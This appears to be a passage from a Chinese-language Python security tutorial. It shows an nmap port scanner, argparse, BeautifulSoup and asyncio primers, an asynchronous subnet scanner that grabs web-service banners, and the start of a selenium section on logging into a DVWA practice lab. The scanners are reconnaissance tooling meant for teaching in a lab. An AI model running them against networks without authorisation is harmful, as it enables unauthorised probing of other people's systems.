<span style="color: #a020f0;">import</span> nmap <span style="color: #b22222;"># </span><span style="color: #b22222;">Import the module</span>

<span style="color: #a0522d;">pr_blue</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[94m'</span>
<span style="color: #a0522d;">pr_red</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[31m'</span>
<span style="color: #a0522d;">pr_yellow</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[93m'</span>
<span style="color: #a0522d;">pr_green</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[96m'</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">nmapScan</span>(tgtHost, tgtPort): <span style="color: #b22222;"># </span><span style="color: #b22222;">Create the function, this fucntion does the scanning</span>
    <span style="color: #a0522d;">nmScan</span> = nmap.PortScanner()
    nmScan.scan(tgtHost, tgtPort)
    <span style="color: #a0522d;">state</span> = nmScan[tgtHost][<span style="color: #8b2252;">"tcp"</span>][<span style="color: #483d8b;">int</span>(tgtPort)][<span style="color: #8b2252;">"state"</span>]
    <span style="color: #a0522d;">protocol</span> = nmScan[tgtHost][<span style="color: #8b2252;">"tcp"</span>][<span style="color: #483d8b;">int</span>(tgtPort)][<span style="color: #8b2252;">"name"</span>]
    <span style="color: #a0522d;">product</span> = nmScan[tgtHost][<span style="color: #8b2252;">"tcp"</span>][<span style="color: #483d8b;">int</span>(tgtPort)][<span style="color: #8b2252;">"product"</span>]
    <span style="color: #a0522d;">version</span> = nmScan[tgtHost][<span style="color: #8b2252;">"tcp"</span>][<span style="color: #483d8b;">int</span>(tgtPort)][<span style="color: #8b2252;">"version"</span>]
    <span style="color: #a0522d;">extrainfo</span> = nmScan[tgtHost][<span style="color: #8b2252;">"tcp"</span>][<span style="color: #483d8b;">int</span>(tgtPort)][<span style="color: #8b2252;">"extrainfo"</span>]
    <span style="color: #a0522d;">result</span> = <span style="color: #8b2252;">"%s[*] %s%s tcp/%s %s[%s]</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">%s%s %s"</span> % (
        pr_red, pr_blue, tgtHost, tgtPort, pr_green, state, pr_yellow, product, version)
    <span style="color: #a020f0;">if</span> extrainfo:
        <span style="color: #a0522d;">result</span> += <span style="color: #8b2252;">"os: %s"</span> % extrainfo
    <span style="color: #483d8b;">print</span>(result)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">main</span>(): <span style="color: #b22222;"># </span><span style="color: #b22222;">Main Program</span>
    <span style="color: #a0522d;">parser</span> = optparse.OptionParser(
        <span style="color: #8b2252;">"usage%prog "</span> + <span style="color: #8b2252;">"-H &lt;host&gt; -p &lt;port&gt;"</span>
    ) <span style="color: #b22222;"># </span><span style="color: #b22222;">Display options/help if required</span>
    parser.add_option(<span style="color: #8b2252;">"-H"</span>, dest=<span style="color: #8b2252;">"tgtHost"</span>, <span style="color: #483d8b;">type</span>=<span style="color: #8b2252;">"string"</span>, <span style="color: #483d8b;">help</span>=<span style="color: #8b2252;">"specify host"</span>)
    parser.add_option(<span style="color: #8b2252;">"-p"</span>, dest=<span style="color: #8b2252;">"tgtPort"</span>, <span style="color: #483d8b;">type</span>=<span style="color: #8b2252;">"string"</span>, <span style="color: #483d8b;">help</span>=<span style="color: #8b2252;">"port"</span>)
    (<span style="color: #a0522d;">options</span>, <span style="color: #a0522d;">args</span>) = parser.parse_args()
    <span style="color: #a0522d;">tgtHost</span> = options.tgtHost
    <span style="color: #a0522d;">tgtPorts</span> = <span style="color: #483d8b;">str</span>(options.tgtPort).split(<span style="color: #8b2252;">","</span>)

    <span style="color: #a020f0;">if</span> (tgtHost == <span style="color: #008b8b;">None</span>) | (tgtPorts[0] == <span style="color: #008b8b;">None</span>):
        <span style="color: #483d8b;">print</span>(parser.usage)
        <span style="color: #008b8b;">exit</span>(0)

    <span style="color: #a020f0;">for</span> tgtPort <span style="color: #a020f0;">in</span> tgtPorts: <span style="color: #b22222;"># </span><span style="color: #b22222;">Scan the hosts with the ports etc</span>
        nmapScan(tgtHost, tgtPort)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">"__main__"</span>:
    main()
</pre>
</div>
</div>
</div>
<div id="outline-container-h:effe6363-5b38-43c7-b194-31139317c996" class="outline-3">
<h3 id="h:effe6363-5b38-43c7-b194-31139317c996">C段WEB服务扫描</h3>
<div class="outline-text-3" id="text-h:effe6363-5b38-43c7-b194-31139317c996">
</div>
<div id="outline-container-h:28b7b96d-9061-4c83-94e2-4df72827eea5" class="outline-4">
<h4 id="h:28b7b96d-9061-4c83-94e2-4df72827eea5">Argparse</h4>
<div class="outline-text-4" id="text-h:28b7b96d-9061-4c83-94e2-4df72827eea5">
<p>
<a href="https://docs.python.org/zh-cn/3/library/argparse.html#module-argparse">argparse</a> 模块可以让人轻松编写用户友好的命令行接口。程序定义它需要的参数，然后 argparse 将弄清如何从 <a href="https://docs.python.org/zh-cn/3/library/sys.html#sys.argv">sys.argv</a> 解析出那些参数。 argparse 模块还会自动生成帮助和使用手册，并在用户给程序传入无效参数时报出错误信息。<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#36733;&#20837;&#27169;&#22359;</span>
<span style="color: #a020f0;">import</span> argparse
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21021;&#22987;&#21270;</span>
<span style="color: #a0522d;">parser</span> = argparse.ArgumentParser()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#32622;&#21629;&#20196;&#34892;&#21442;&#25968;</span>
parser.add_argument(<span style="color: #8b2252;">"echo"</span>, action=<span style="color: #8b2252;">"store_true"</span>, <span style="color: #483d8b;">help</span>=<span style="color: #8b2252;">"echo the string you use here"</span>)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21442;&#25968;&#35299;&#26512;</span>
<span style="color: #a0522d;">args</span> = parser.parse_args()
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#21442;&#25968;</span>
<span style="color: #483d8b;">print</span>(args.echo)
</pre>
</div>

<p>
执行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&gt; python argparse_test.py -h
usage: test.py [-h]

positional arguments:
  <span style="color: #483d8b;">echo</span> echo the string you use here

optional arguments:
  -h, --help show this help message and exit
</pre>
</div>

<p>
可以看到自带 -h 参数和 useage 信息<br>
</p>
</div>
</div>
<div id="outline-container-h:11e4a758-b8d7-4ed8-96d8-18495826e65f" class="outline-4">
<h4 id="h:11e4a758-b8d7-4ed8-96d8-18495826e65f">BeautifulSoup</h4>
<div class="outline-text-4" id="text-h:11e4a758-b8d7-4ed8-96d8-18495826e65f">
<p>
Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。<br>
</p>

<p>
Beautiful Soup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。你不需要考虑编码方式，除非文档没有指定一个编码方式，这时，Beautiful Soup就不能自动识别编码方式了。然后，你仅仅需要说明一下原始编码方式就可以了。<br>
</p>

<p>
Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:<br>
</p>
<ul class="org-ul">
<li>Tag - HTML 中的一个个标签<br></li>
<li>NavigableString - 字符串类型<br></li>
<li>BeautifulSoup - 表示的是一个文档的全部内容<br></li>
<li>Comment - 注释的类型<br></li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> lxml
<span style="color: #a020f0;">from</span> bs4 <span style="color: #a020f0;">import</span> BeautifulSoup

<span style="color: #a0522d;">html</span> = <span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"</span>
<span style="color: #8b2252;"> "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;</span>
<span style="color: #8b2252;">&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;</span>
<span style="color: #8b2252;">  &lt;head&gt;</span>
<span style="color: #8b2252;">  &lt;/head&gt;</span>
<span style="color: #8b2252;">  &lt;div class="body_padded"&gt;</span>
<span style="color: #8b2252;">    &lt;h1&gt;Vulnerability: Brute Force&lt;/h1&gt;</span>
<span style="color: #8b2252;">    &lt;div class="vulnerable_code_area"&gt;</span>
<span style="color: #8b2252;">      &lt;h2&gt;Login&lt;/h2&gt;</span>
<span style="color: #8b2252;">      &lt;form action="#" method="GET"&gt;</span>
<span style="color: #8b2252;">        Username:&lt;br /&gt;</span>
<span style="color: #8b2252;">        &lt;input type="text" name="username"&gt;&lt;br /&gt;</span>
<span style="color: #8b2252;">        Password:&lt;br /&gt;</span>
<span style="color: #8b2252;">        &lt;input type="password" AUTOCOMPLETE="off" name="password"&gt;&lt;br /&gt;</span>
<span style="color: #8b2252;">        &lt;br /&gt;</span>
<span style="color: #8b2252;">        &lt;input type="submit" value="Login" name="Login"&gt;</span>
<span style="color: #8b2252;">      &lt;/form&gt;</span>
<span style="color: #8b2252;">      &lt;p&gt;Welcome to the password protected area gordonb&lt;/p&gt;&lt;img src="http://127.0.0.1/hackable/users/gordonb.jpg" /&gt;</span>
<span style="color: #8b2252;">    &lt;/div&gt;</span>
<span style="color: #8b2252;">    &lt;h2&gt;More Information&lt;/h2&gt;</span>
<span style="color: #8b2252;">    &lt;ul&gt;</span>
<span style="color: #8b2252;">      &lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)" target="_blank"&gt;https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)&lt;/a&gt;&lt;/li&gt;</span>
<span style="color: #8b2252;">      &lt;li&gt;&lt;a href="http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password" target="_blank"&gt;http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password&lt;/a&gt;&lt;/li&gt;</span>
<span style="color: #8b2252;">      &lt;li&gt;&lt;a href="http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html" target="_blank"&gt;http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html&lt;/a&gt;&lt;/li&gt;</span>
<span style="color: #8b2252;">    &lt;/ul&gt;</span>
<span style="color: #8b2252;">&lt;/body&gt;</span>
<span style="color: #8b2252;">&lt;/html&gt;</span>
<span style="color: #8b2252;">"""</span>
<span style="color: #a0522d;">soup</span> = BeautifulSoup(html, <span style="color: #8b2252;">'lxml'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25991;&#26723;&#23545;&#35937;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#25214;a&#26631;&#31614;,&#21482;&#20250;&#26597;&#25214;&#20986;&#19968;&#20010;a&#26631;&#31614;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">print(soup.a)#&lt;a class="sister" href="http://example.com/elsie" id="xiaodeng"&gt;&lt;!--Elsie --&gt;&lt;/a&gt;</span>

<span style="color: #a020f0;">for</span> k <span style="color: #a020f0;">in</span> soup.find_all(<span style="color: #8b2252;">'a'</span>):
    <span style="color: #483d8b;">print</span>(k[<span style="color: #8b2252;">'href'</span>]) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;a&#26631;&#31614;&#30340;href&#20540;</span>
    <span style="color: #483d8b;">print</span>(k.string) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;a&#26631;&#31614;&#30340;string</span>
</pre>
</div>

<p>
获取tag<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #483d8b;">print</span>(soup.title)
<span style="color: #483d8b;">print</span>(soup.head)
<span style="color: #483d8b;">print</span>(soup.a)
<span style="color: #483d8b;">print</span>(soup.p)
<span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(soup.a))
</pre>
</div>
</div>
</div>
<div id="outline-container-h:03364af4-7b7a-4b46-8d75-960ce68bcfbf" class="outline-4">
<h4 id="h:03364af4-7b7a-4b46-8d75-960ce68bcfbf">asyncio &#x2014; 异步 I/O</h4>
<div class="outline-text-4" id="text-h:03364af4-7b7a-4b46-8d75-960ce68bcfbf">
<p>
asyncio 是用来编写 并发 代码的库，使用 async/await 语法。<br>
</p>

<p>
asyncio 被用作多个提供高性能 Python 异步框架的基础，包括网络和网站服务，数据库连接库，分布式任务队列等等。<br>
</p>

<p>
示例一<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> asyncio
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">say_after</span>(delay, what):
    <span style="color: #a020f0;">await</span> asyncio.sleep(delay)
    <span style="color: #483d8b;">print</span>(what)

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">main</span>():
    <span style="color: #483d8b;">print</span>(f<span style="color: #8b2252;">"started at </span>{time.strftime('%X')}<span style="color: #8b2252;">"</span>)
    <span style="color: #a020f0;">await</span> say_after(1, <span style="color: #8b2252;">'hello'</span>)
    <span style="color: #a020f0;">await</span> say_after(2, <span style="color: #8b2252;">'world'</span>)
    <span style="color: #483d8b;">print</span>(f<span style="color: #8b2252;">"finished at </span>{time.strftime('%X')}<span style="color: #8b2252;">"</span>)

asyncio.run(main())
</pre>
</div>

<p>
输出：3秒完成<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">started at 16:03:40
hello
world
finished at 16:03:43
</pre>
</div>

<p>
示例二<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> asyncio
<span style="color: #a020f0;">import</span> time

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">say_after</span>(delay, what):
    <span style="color: #a020f0;">await</span> asyncio.sleep(delay)
    <span style="color: #483d8b;">print</span>(what)

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">main</span>():
    <span style="color: #a0522d;">task1</span> = asyncio.create_task(
        say_after(1, <span style="color: #8b2252;">'hello'</span>))
    <span style="color: #a0522d;">task2</span> = asyncio.create_task(
        say_after(2, <span style="color: #8b2252;">'world'</span>))
    <span style="color: #483d8b;">print</span>(f<span style="color: #8b2252;">"started at </span>{time.strftime('%X')}<span style="color: #8b2252;">"</span>)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">Wait until both tasks are completed (should take</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">around 2 seconds.)</span>
    <span style="color: #a020f0;">await</span> task1
    <span style="color: #a020f0;">await</span> task2
    <span style="color: #483d8b;">print</span>(f<span style="color: #8b2252;">"finished at </span>{time.strftime('%X')}<span style="color: #8b2252;">"</span>)

asyncio.run(main())
</pre>
</div>

<p>
输出：2秒完成<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">started at 16:08:21
hello
world
finished at 16:08:23
</pre>
</div>

<p>
<b>什么是协程？</b><br>
</p>

<p>
协程在等待IO的过程中重复利用线程，也就是说协程本质是通过多路复用来完成的。<br>
</p>

<p>
协程能保留上一次调用时的状态（即所有局部状态的一个特定组合），每次过程重入时，就相当于进入上一次调用的状态，换种说法：进入上一次离开时所处逻辑流的位置。<br>
</p>
</div>
</div>
<div id="outline-container-h:0478780f-22dc-4e8e-ae36-7ac1f53acdda" class="outline-4">
<h4 id="h:0478780f-22dc-4e8e-ae36-7ac1f53acdda">C段扫描程序</h4>
<div class="outline-text-4" id="text-h:0478780f-22dc-4e8e-ae36-7ac1f53acdda">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> asyncio
<span style="color: #a020f0;">import</span> sys
<span style="color: #a020f0;">import</span> requests
<span style="color: #a020f0;">from</span> netaddr <span style="color: #a020f0;">import</span> IPNetwork
<span style="color: #a020f0;">from</span> bs4 <span style="color: #a020f0;">import</span> BeautifulSoup

<span style="color: #a0522d;">Ports_web</span> = [80, 88, 443, 7001, 8000, 8008, 8888, 8080, 8088, 8089, 8161, 9090]
<span style="color: #a0522d;">Ports_other</span> = [21, 22, 445, 1100, 1433, 1434, 1521, 3306, 3389, 6379, 8009, 9200,11211, 27017, 50070]

<span style="color: #a0522d;">COUNT</span> = 0
<span style="color: #a0522d;">TIMEOUT_HTTP</span> = 5
<span style="color: #a0522d;">TIMEOUT_SOCK</span> = 0.9
<span style="color: #a0522d;">PATH</span> = <span style="color: #8b2252;">''</span>

<span style="color: #a0522d;">user_agent</span> = <span style="color: #8b2252;">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)"</span> \
<span style="color: #8b2252;">" Chrome/101.0.4951.41 Safari/537.36"</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36755;&#20986;&#23383;&#31526;&#26102;&#30340;&#21508;&#31181;&#39068;&#33394;&#21069;&#32512;</span>
<span style="color: #a0522d;">pr_purp</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[95m'</span>
<span style="color: #a0522d;">pr_blue</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[94m'</span>
<span style="color: #a0522d;">pr_red</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[31m'</span>
<span style="color: #a0522d;">pr_yellow</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[93m'</span>
<span style="color: #a0522d;">pr_green</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[96m'</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#32467;&#26463;&#39068;&#33394;</span>
<span style="color: #a0522d;">pr_end</span> = <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\033</span><span style="color: #8b2252;">[0m'</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">tag</span>(info):
    <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"["</span> + info + <span style="color: #8b2252;">"]"</span>

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_info</span>(url, keyword):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">r</span> = requests.get(url, headers={<span style="color: #8b2252;">'UserAgent'</span>: user_agent}, timeout=TIMEOUT_HTTP, verify=<span style="color: #008b8b;">False</span>,
                         allow_redirects=<span style="color: #008b8b;">True</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35299;&#26512;html</span>
        <span style="color: #a0522d;">soup</span> = BeautifulSoup(r.content, <span style="color: #8b2252;">"lxml"</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">HTTP&#22836;&#20449;&#24687;&#20998;&#26512;</span>
        <span style="color: #a0522d;">info_code</span> = tag(pr_red + <span style="color: #483d8b;">str</span>(r.status_code) + pr_end)
        <span style="color: #a0522d;">info_title</span> = tag(pr_blue + soup.title.string.replace(<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">'</span>, <span style="color: #8b2252;">''</span>).replace(<span style="color: #8b2252;">'</span><span style="color: #008b8b;">\r</span><span style="color: #8b2252;">'</span>, <span style="color: #8b2252;">''</span>).replace(
            <span style="color: #8b2252;">'</span><span style="color: #008b8b;">\t</span><span style="color: #8b2252;">'</span>, <span style="color: #8b2252;">''</span>) + pr_end) <span style="color: #a020f0;">if</span> soup.title <span style="color: #a020f0;">else</span> tag(<span style="color: #8b2252;">""</span>)
        <span style="color: #a0522d;">info_len</span> = tag(pr_purp + <span style="color: #483d8b;">str</span>(<span style="color: #483d8b;">len</span>(r.content)) + pr_end)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#35831;&#27714;&#22836;&#20013;&#30340;&#26381;&#21153;&#22120;&#20449;&#24687;</span>
        <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'Server'</span> <span style="color: #a020f0;">in</span> r.headers:
            <span style="color: #a0522d;">info_server</span> = <span style="color: #8b2252;">" ["</span> + pr_yellow + r.headers[<span style="color: #8b2252;">'Server'</span>]
            <span style="color: #a0522d;">info_server</span> += <span style="color: #8b2252;">" "</span> + r.headers[<span style="color: #8b2252;">'X-Powered-By'</span>] + pr_end + <span style="color: #8b2252;">"]"</span> <span style="color: #a020f0;">if</span> <span style="color: #8b2252;">'X-Powered-By'</span> <span style="color: #a020f0;">in</span> r.headers <span style="color: #a020f0;">else</span> <span style="color: #8b2252;">"]"</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a0522d;">info_server</span> = tag(<span style="color: #8b2252;">""</span>)
        <span style="color: #a0522d;">result</span> = info_code + info_title + info_server + info_len
        <span style="color: #b22222;"># </span><span style="color: #b22222;">HTTP&#20869;&#23481;&#65292;&#20851;&#38190;&#23383;&#21305;&#37197;</span>
        <span style="color: #a0522d;">key</span> = tag(pr_red + <span style="color: #8b2252;">"Keyword!!!"</span> + pr_end) <span style="color: #a020f0;">if</span> keyword <span style="color: #a020f0;">and</span> keyword <span style="color: #a020f0;">in</span> r.text <span style="color: #a020f0;">else</span> <span style="color: #8b2252;">""</span>

        <span style="color: #a020f0;">return</span> result + key
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #b22222;"># </span><span style="color: #b22222;">print(e)</span>
        <span style="color: #a020f0;">return</span> tag(pr_green + <span style="color: #8b2252;">"open"</span> + pr_end)

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">connet</span>(host, sem, keyword):
    <span style="color: #8b2252;">"""</span>
<span style="color: #8b2252;">    &#20808;&#29992;&#24322;&#27493;&#32593;&#32476;&#35831;&#27714;&#21028;&#26029;&#31471;&#21475;&#26159;&#21542;&#23384;&#22312;&#65292;&#22914;&#26524;&#23384;&#22312;&#65292;&#20877;&#23545;web&#31471;&#21475;&#36827;&#34892;&#20449;&#24687;&#36755;&#20986;</span>
<span style="color: #8b2252;">    :param host thread keyword ip</span>
<span style="color: #8b2252;">    :param sem: &#35774;&#32622;&#36827;&#31243;</span>
<span style="color: #8b2252;">    :param keyword: &#23545;web&#20869;&#23481;&#20851;&#38190;&#23383;&#21305;&#37197;</span>
<span style="color: #8b2252;">    :param ip: &#33719;&#21462;&#30446;&#26631;host&#30340;IP</span>
<span style="color: #8b2252;">    :return info</span>
<span style="color: #8b2252;">    """</span>
    <span style="color: #a020f0;">global</span> COUNT
    <span style="color: #a020f0;">async with</span> sem:
        <span style="color: #a020f0;">for</span> port <span style="color: #a020f0;">in</span> Ports_web:
            <span style="color: #a0522d;">fut</span> = asyncio.open_connection(host=host, port=port)
            <span style="color: #a020f0;">try</span>:
                <span style="color: #a0522d;">reader</span>, <span style="color: #a0522d;">writer</span> = <span style="color: #a020f0;">await</span> asyncio.wait_for(fut, timeout=TIMEOUT_SOCK)
                <span style="color: #a020f0;">if</span> writer:
                    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377; 443/8443 &#31471;&#21475;&#65292;&#21017;&#20351;&#29992;http&#21327;&#35758;&#65292;&#21542;&#21017;&#20351;&#29992;https&#21327;&#35758;</span>
                    <span style="color: #a0522d;">protocol</span> = <span style="color: #8b2252;">"http"</span> <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">int</span>(port) <span style="color: #a020f0;">not</span> <span style="color: #a020f0;">in</span> [443, 8443] <span style="color: #a020f0;">else</span> <span style="color: #8b2252;">"https"</span>
                    <span style="color: #a0522d;">url</span> = <span style="color: #8b2252;">"{0}://{1}:{2}{3}"</span>.<span style="color: #483d8b;">format</span>(protocol, host, port, PATH)
                    <span style="color: #a0522d;">info</span> = get_info(url, keyword)

                    sys.stdout.write(<span style="color: #8b2252;">"%s %s</span><span style="color: #008b8b;">\n</span><span style="color: #8b2252;">"</span> % (url, info))
                    <span style="color: #a0522d;">COUNT</span> += 1
            <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
                <span style="color: #b22222;"># </span><span style="color: #b22222;">print(e)</span>
                <span style="color: #a020f0;">pass</span>

<span style="color: #a020f0;">async def</span> <span style="color: #0000ff;">scan</span>():
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#20110;&#24182;&#21457;&#25511;&#21046;&#30340;&#20449;&#21495;&#37327;</span>
    <span style="color: #a0522d;">sem</span> = asyncio.Semaphore(60)
    <span style="color: #a0522d;">keyword</span> = <span style="color: #8b2252;">""</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25195;&#25551;&#26102;&#30340;&#20851;&#38190;&#23383;</span>
    <span style="color: #a0522d;">c_ip</span> = <span style="color: #8b2252;">"192.168.0.1/24"</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">C&#27573;IP&#36716;&#25442;&#20026;&#21333;&#20010;IP&#30340;list</span>
    <span style="color: #a0522d;">ips</span> = [<span style="color: #483d8b;">str</span>(ip) <span style="color: #a020f0;">for</span> ip <span style="color: #a020f0;">in</span> IPNetwork(c_ip)]
    <span style="color: #a0522d;">tasks</span> = []
    <span style="color: #a020f0;">for</span> host <span style="color: #a020f0;">in</span> ips:
        tasks.append(asyncio.create_task(connet(host, sem, keyword)))
    <span style="color: #a020f0;">await</span> asyncio.wait(tasks)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">__name__</span> == <span style="color: #8b2252;">'__main__'</span>:
    asyncio.run(scan())
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:816ea01e-f627-4c81-adf0-c287ca3ecdd7" class="outline-2">
<h2 id="h:816ea01e-f627-4c81-adf0-c287ca3ecdd7">python 爬虫技术实现</h2>
<div class="outline-text-2" id="text-h:816ea01e-f627-4c81-adf0-c287ca3ecdd7">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>爬虫基础简介<br></li>
<li>requests 模块高级操作<br></li>
<li>requests 模块<br></li>
<li>高性能异步爬虫<br></li>
<li>数据解析<br></li>
<li>selenium 模块应用<br></li>
<li>验证码识别<br></li>
<li>scrapy 框架<br></li>
</ul>
</div>
<div id="outline-container-h:4cbc9ab5-52ea-4d72-9540-a395043ee376" class="outline-3">
<h3 id="h:4cbc9ab5-52ea-4d72-9540-a395043ee376">selenium 开发爬虫</h3>
<div class="outline-text-3" id="text-h:4cbc9ab5-52ea-4d72-9540-a395043ee376">
<p>
Selenium Python 绑定提供了方便的 API 来访问 Selenium WebDrivers，如 Firefox、Ie、Chrome、Remote等。当前支持的 Python 版本为 2.7、3.5 及更高版本。<br>
</p>

<ul class="org-ul">
<li>开源和可移植 ——Selenium 是一个开源和可移植的 Web 测试框架。<br></li>
<li>工具和 DSL 的结合——Selenium 是工具和 DSL（领域特定语言）的结合，以进行各种类型的测试。<br></li>
<li>更容易理解和实现 ——Selenium 命令按照不同的类进行分类，这使得它更容易理解和实现。<br></li>
<li>减少测试执行时间 ——Selenium 支持并行测试执行，从而减少执行并行测试所花费的时间。<br></li>
<li>所需资源 更少——与 UFT、RFT 等竞争对手相比，Selenium 需要更少的资源。<br></li>
<li>支持多种操作系统 ——Android、iOS、Windows、Linux、Mac、Solaris。<br></li>
<li>支持多种浏览器 - Google Chrome、Mozilla Firefox、Internet Explorer、Edge、Opera、Safari 等。<br></li>
<li>并行测试执行 ——它还支持并行测试执行，从而减少时间并提高测试效率。<br></li>
</ul>
</div>
<div id="outline-container-h:ee491f30-c71e-4b7f-92b1-56d427dfb639" class="outline-4">
<h4 id="h:ee491f30-c71e-4b7f-92b1-56d427dfb639">安装selenium</h4>
<div class="outline-text-4" id="text-h:ee491f30-c71e-4b7f-92b1-56d427dfb639">
<p>
安装Python3.x: <a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a><br>
</p>

<p>
Linux &amp; Mac<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">pip install selenium
</pre>
</div>

<p>
Windows<br>
从开始菜单点击运行（或者 Windows+R ）输入 cmd ,然后执行下列命令安装:<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">C:\Python35\Scripts\pip.exe install selenium
</pre>
</div>

<p>
现在你可以使用Python运行测试脚本了。 例如：如果你创建了一个selenium的基本示例并且保存在了C:my_selenium_script.py ，你可以如下执行:<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">C:\Python35\python.exe C:\my_selenium_script.py
</pre>
</div>

<p>
<b>安装网络驱动程序</b><br>
</p>

<p>
可以安装 Firefox、Chromium、PhantomJs（现已弃用）等。<br>
</p>

<p>
要使用 Firefox，您可能需要安装 GeckoDriver 下载地址<a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a><br>
安装好之后，将可执行程序加入环境变量<br>
</p>
</div>
</div>
<div id="outline-container-h:07609fad-5b66-47a2-a22a-50bfbbd505d0" class="outline-4">
<h4 id="h:07609fad-5b66-47a2-a22a-50bfbbd505d0">selenium 开发</h4>
<div class="outline-text-4" id="text-h:07609fad-5b66-47a2-a22a-50bfbbd505d0">
<p>
先看一个Demo，通过Demo了解一下selenium的基本用法;<br>
</p>

<p>
效果：通过selenium自动登录DVWA靶机系统<br>
</p>

<ol class="org-ol">
<li>首先开启DVWA <code>docker start dvwa</code><br></li>
<li><p>
查看DVWA登录页面前端代码，我们的目标是实现自动登录，那么首先就需要获取到登录的输入框，通过查看页面源代码发现，输入框分别为两个input 标签，一个 name="username" ，另一个 name="password"<br>
</p>
<div class="org-src-container">
